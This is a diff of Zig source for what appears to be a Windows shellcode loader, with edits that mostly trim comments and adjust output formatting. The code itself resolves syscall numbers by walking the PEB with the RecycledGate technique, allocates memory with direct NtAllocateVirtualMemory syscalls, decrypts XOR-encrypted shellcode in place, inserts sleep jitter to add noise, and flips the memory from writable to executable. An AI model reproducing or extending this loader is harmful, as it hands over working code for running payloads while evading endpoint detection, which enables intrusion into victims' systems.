@@ -18,7 +18,6 @@ var g_sys: syscall.Syscalls = undefined;
 
 //--------------------------------------------------------> LOGGING HELPERS
 
-// logging helpers.
 fn ok(comptime fmt: []const u8, args: anytype) void {
     print("[+] " ++ fmt ++ "\n", args);
 }
@@ -44,7 +43,7 @@ fn banner() void {
 }
 
 //--------------------------------------------------------> JITTER
-// pseudorandom sleep between stages. not crypto, just noise.
+// pseudorandom sleep via NtDelayExecution (10000x = ms→100ns). not crypto, just noise.
 fn jitter(min_ms: u64, max_ms: u64) void {
     const delay: i64 = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000))));
     _ = syscall.syscall_dispatch(
@@ -72,16 +71,15 @@ pub fn main() void {
         err("failed to resolve syscalls", .{});
         return;
     };
-    ok("syscalls resolved via PEB walk + RecycledGate", .{});
-    print("    NtAllocateVirtualMemory  ssn={d}\n", .{g_sys.NtAllocateVirtualMemory.number});
-    print("    NtProtectVirtualMemory   ssn={d}\n", .{g_sys.NtProtectVirtualMemory.number});
-    print("    NtDelayExecution         ssn={d}\n", .{g_sys.NtDelayExecution.number});
+    ok("syscalls : resolved via PEB walk + RecycledGate", .{});
+    print("           NtAllocateVirtualMemory  ssn={d}\n", .{g_sys.NtAllocateVirtualMemory.number});
+    print("           NtProtectVirtualMemory   ssn={d}\n", .{g_sys.NtProtectVirtualMemory.number});
+    print("           NtDelayExecution         ssn={d}\n", .{g_sys.NtDelayExecution.number});
 
-    const current_process: windows.HANDLE = nt.NtCurrentProcess; // handle to our own process
-    var base_addr: ?*anyopaque = null; // allocation base
+    const current_process: windows.HANDLE = nt.NtCurrentProcess;
+    var base_addr: ?*anyopaque = null;
     var size: windows.SIZE_T = shellcode.len;
 
-    // allocate RW memory.
     const status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
         g_sys.NtAllocateVirtualMemory.number,
         &[_]usize{
@@ -97,14 +95,12 @@ pub fn main() void {
     ok("allocated {d} bytes at 0x{X}", .{ size, @intFromPtr(base_addr) });
     jitter(10, 50);
 
-    // copy encrypted shellcode and decrypt in-place.
     const buffer: [*]u8 = @ptrCast(base_addr);
     @memcpy(buffer[0..shellcode.len], shellcode);
     for (buffer[0..shellcode.len], 0..) |*b, i| b.* ^= key_bytes[i % key_bytes.len];
     ok("decrypted in-place ({d} bytes)", .{shellcode.len});
     jitter(10, 30);
 
-    // rw → rx.
     var old_protect: windows.ULONG = 0;
     const prot_status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
         g_sys.NtProtectVirtualMemory.number,
